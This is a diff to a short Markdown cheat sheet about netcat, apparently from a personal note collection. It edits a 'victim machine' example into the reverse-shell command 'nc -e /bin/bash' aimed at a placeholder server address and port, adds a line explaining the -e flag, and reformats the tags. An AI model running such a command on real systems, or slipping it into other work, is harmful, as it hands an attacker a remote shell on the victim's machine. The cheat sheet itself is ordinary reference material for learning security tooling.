@@ -1,4 +1,4 @@
-# Netcat
+# netcat
 Netcat is a tool that reads and writes data across network connections, using TCP or UDP protocol. More information [Link](https://blog.ikuamike.io/posts/2021/netcat/)
 
 ## Server Mode
@@ -50,11 +50,10 @@ $ nc -lvnp 8080
 
 > Client (Victim Machine)
 ```bash
-$ nc [HOST_IP] [PORT] -e /bin/bash
+$ nc -e /bin/bash @Server_IP PORT
 ```
+[-e]: Execute external program after accepting a connection or making connection.
 
-# 
 
-Tags
-
-[#cheat-sheet](app://obsidian.md/index.html#cheat-sheet)
+# Tags
+#Cheat_Sheet #netcat
